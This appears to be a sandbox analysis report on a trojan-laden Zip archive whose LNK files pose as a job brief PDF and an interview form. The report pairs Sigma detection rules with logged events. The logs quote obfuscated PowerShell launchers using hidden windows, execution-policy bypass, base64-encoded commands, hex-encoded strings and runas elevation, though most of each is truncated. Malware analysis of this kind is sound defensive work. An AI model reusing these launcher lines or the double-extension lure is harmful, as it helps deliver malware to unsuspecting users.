attributes.magic: Zip archive data, at least v2.0 to extract, compression method=store

threat_severity.level_description: Severity MEDIUM because it was considered trojan.

sigma_analysis_results.rule_title: Suspicious Parent Double Extension File Execution
sigma_analysis_results.rule_description: Detect execution of suspicious double extension files in ParentCommandLine

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=Cmd.Exe; Hashes=SHA1=E563BAE25E3C011A1E69B4636C9B29B5661C460A,MD5=89B5A70BF37A93015F4845BF901B7825,SHA256=678652BB50ABB92DE91A69C05EA018C160FB4BE0902ACE14B15749246788CB40,IMPHASH=FD97AFEC4DC549DCD1FE1DAD15035DF9; Description=Windows Command Processor; EventID=1; ParentCommandLine="cmd.exe" /C "C:\Users\Bruno\AppData\Local\Temp\i41kmwdn.3ju\Confidential_Job_Brief_Senior_Marketing_Manager.pdf.lnk"; CommandLine="C:\Windows\system32\cmd.exe" /c "STArT /min "" PoWeRshElL -ENc  " [TRUNCATED]; FileVersion=10.0.22621.1635 (WinBuild.160101.0800); ParentImage=C:\Windows\SysWOW64\cmd.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\cmd.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects suspicious powershell process starts with base64 encoded commands (e.g. Emotet)
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy, Anton Kutepov, oscd.community

match_context.values: @{Hashes=SHA1=3D6861E137699ADD6E1DB51E2F9D96A9FC4F122D,MD5=1089F6E6C6C219009F75C637ED302F99,SHA256=5A1D9329C862C908B050896FEFA49628D00A914EE2155CEFCAA7704BD1A5E2C8,IMPHASH=FF24CEF596AA4AA9D65391184A89D008; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.22621.2361 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\system32\cmd.exe" /c start /min "" powershell.exe -w hidden -NoProfile -ExecutionPolicy bypass -EncodedCommand  [TRUNCATED]; CommandLine=powershell.exe  -w hidden -NoProfile -ExecutionPolicy bypass -EncodedCommand  [TRUNCATED]; EventID=1; ParentImage=C:\Windows\SysWOW64\cmd.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

match_context.values: @{Hashes=SHA1=3D6861E137699ADD6E1DB51E2F9D96A9FC4F122D,MD5=1089F6E6C6C219009F75C637ED302F99,SHA256=5A1D9329C862C908B050896FEFA49628D00A914EE2155CEFCAA7704BD1A5E2C8,IMPHASH=FF24CEF596AA4AA9D65391184A89D008; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\system32\cmd.exe" /c start /min "" powershell.exe -w hidden -NoProfile -ExecutionPolicy bypass -EncodedCommand  [TRUNCATED]; CommandLine=powershell.exe  -w hidden -NoProfile -ExecutionPolicy bypass -EncodedCommand  [TRUNCATED]; FileVersion=10.0.22621.2361 (WinBuild.160101.0800); ParentImage=C:\Windows\SysWOW64\cmd.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Change PowerShell Policies to an Insecure Level
sigma_analysis_results.rule_description: Detects changing the PowerShell script execution policy to a potentially insecure level using the "-ExecutionPolicy" flag.

match_context.values: @{Hashes=SHA1=3D6861E137699ADD6E1DB51E2F9D96A9FC4F122D,MD5=1089F6E6C6C219009F75C637ED302F99,SHA256=5A1D9329C862C908B050896FEFA49628D00A914EE2155CEFCAA7704BD1A5E2C8,IMPHASH=FF24CEF596AA4AA9D65391184A89D008; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\system32\cmd.exe" /c start /min "" powershell.exe -w hidden -NoProfile -ExecutionPolicy bypass -EncodedCommand  [TRUNCATED]; CommandLine=powershell.exe  -w hidden -NoProfile -ExecutionPolicy bypass -EncodedCommand  [TRUNCATED]; FileVersion=10.0.22621.2361 (WinBuild.160101.0800); ParentImage=C:\Windows\SysWOW64\cmd.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden

match_context.values: @{ScriptBlockText=Start-Process -FilePath "powershell.exe" -WindowStyle Hidden  -ArgumentList '-NoProfile -w hidden -Command "$DAta = ([TEXt.ENCoDING]::UTF8.GETStriNG((&(\"{0}{1}{2}\" -F [ChAR]((61 + 12)),[CHaR]((23 + 64)),[Char]((79 + 3))) (-join ([regex]::Matches(\"FEE2E2E6E5ACB9B9E0F7F8F2F7F7F1E6F3E4E5F9F8F3F3FAE5F2FFF3F8E5E2F3F8B8F8FAB9E2B9A3A7A6F2A6A3F3A5A2F2F0AFF7A6AFA5A4AEA4F3A4A0A6AEF4A3A6F5A4AEAFA1AEA2A3A6F3A7F7F7F0A4F5AFA4A4A0A5AFAEA2AFA7F4F7A5A6AEF0F4A4A0AFAF\", \"..\") | % { [char]([convert]::ToByte($ [TRUNCATED]; Path=; ScriptBlockId=2e669178-51a8-4f1a-9e53-bb32e328859b; MessageTotal=1; EventID=4104; MessageNumber=1}

@{ScriptBlockText=Start-Process -FilePath "powershell.exe" -WindowStyle Hidden  -ArgumentList '-NoProfile -w hidden -Command "$DATA = ([TeXT.EnCODinG]::UTF8.GEtSTRIng((&(\"{0}{1}{2}\" -F [CHAR]((48 + 25)),[cHar]((178 - 91)),[CHAR]((4 + 78))) (-join ([regex]::Matches(\"D3CFCFCBC8819494CDDAD5DFDADADCCBDEC9C8D4D5DEDED7C8DFD2DED5C8CFDED595D5D794CF94D88F8B8D828E88DF8DDADF8ED9DD82DA8C8D88DDD9DD8E898F8D8A8B838983DFDE8C8F89DF88898A83D8DFD88A8A89DE838FDA8B838EDA8DD9888CD8DFDD838C\", \"..\") | % { [char]([convert]::ToByte( [TRUNCATED]; MessageTotal=1; ScriptBlockId=35e7012f-6c0f-4bc7-b66a-b287367e028d; Path=; MessageNumber=1; EventID=4104}

@{ScriptBlockText=e3a69531917e3737d6a32d92312795cb094349a6491e874f1a610564f139b8d6 "Start RunAs";
Start-Process "cmd.exe" -Verb runas -WindowStyle hidden -ArgumentList ("/c start /min """" powershell.exe -w hidden -NoProfile -ExecutionPolicy bypass -EncodedCommand JABkAGEAdABhACAAPQAgACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoACgAJgAoACIAewAwAH0AewAxAH0AewAyAH0AIgAgAC0AZgAgAFsAYwBoAGEAcgBdACgAKAAyADYAIAArACAANAA3ACkAKQAsAFsAYwBoAGEAcgBdACgAKAAxADMAMgAgAC0AIAA0ADUAKQAp [TRUNCATED]; Path=; ScriptBlockId=82c4d2f9-4a09-4c5f-8e8f-e77817661f53; MessageTotal=1; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

sigma_analysis_results.rule_title: Suspicious LNK Double Extension File Created
sigma_analysis_results.rule_description: Detects the creation of files with an "LNK" as a second extension. This is sometimes used by malware as a method to abuse the fact that Windows hides the "LNK" extension by default.

match_context.values: @{Image=C:\Windows\SysWOW64\7za.exe; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\i41kmwdn.3ju\Confidential_Job_Brief_Senior_Marketing_Manager.pdf.lnk; EventID=11}
@{Image=C:\Windows\SysWOW64\7za.exe; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\i41kmwdn.3ju\Exclusive_Interview_Availability_Form_Senior_Marketing_Manager.docx.lnk; EventID=11}
@{Image=C:\Windows\SysWOW64\cmd.exe; EventID=11; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\i41kmwdn.3ju\Confidential_Job_Brief_Senior_Marketing_Manager.pdf.lnk}
@{Image=C:\Windows\SysWOW64\cmd.exe; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\i41kmwdn.3ju\Exclusive_Interview_Availability_Form_Senior_Marketing_Manager.docx.lnk; EventID=11}

sigma_analysis_results.rule_description: Commandline to launch powershell with a base64 payload

sigma_analysis_results.rule_description: Detects specific combinations of encoding methods in PowerShell via the commandline
sigma_analysis_results.rule_author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton

sigma_analysis_results.rule_title: PowerShell Script With File Upload Capabilities
sigma_analysis_results.rule_description: Detects PowerShell scripts leveraging the "Invoke-WebRequest" cmdlet to send data via either "PUT" or "POST" method.
Get the processes that are running on the local computer.

sigma_analysis_results.rule_title: Potential PowerShell Obfuscation Using Alias Cmdlets
sigma_analysis_results.rule_description: Detects Set-Alias or New-Alias cmdlet usage. Which can be use as a mean to obfuscate PowerShell scripts

match_context.values: @{ScriptBlockText=Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; Path=; ScriptBlockId=14d5fb63-9c38-407f-8d52-64257976c026; MessageTotal=1; MessageNumber=1; EventID=4104}
